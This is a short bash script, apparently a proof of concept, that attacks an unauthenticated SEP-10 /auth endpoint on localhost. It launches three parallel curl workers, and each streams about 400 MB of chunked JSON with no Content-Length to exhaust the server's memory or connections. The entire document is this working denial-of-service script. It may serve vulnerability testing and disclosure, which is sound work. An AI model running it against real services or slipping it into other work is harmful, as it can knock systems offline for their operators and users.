#!/bin/bash
# Stream a ~400 MB JSON body (no Content-Length) to the unauthenticated SEP-10 endpoint, 3 in parallel.
for i in 1 2 3; do
  ( ( printf '{"transaction":"'; head -c 400000000 /dev/zero | tr '\0' 'A'; printf '"}' ) | \
    curl -s -o /dev/null -w "worker $i -> HTTP %{http_code}, sent %{size_upload} bytes in %{time_total}s\n" \
      -X POST http://localhost:8080/auth -H 'Content-Type: application/json' -H 'Transfer-Encoding: chunked' --data-binary @- ) &
done
wait
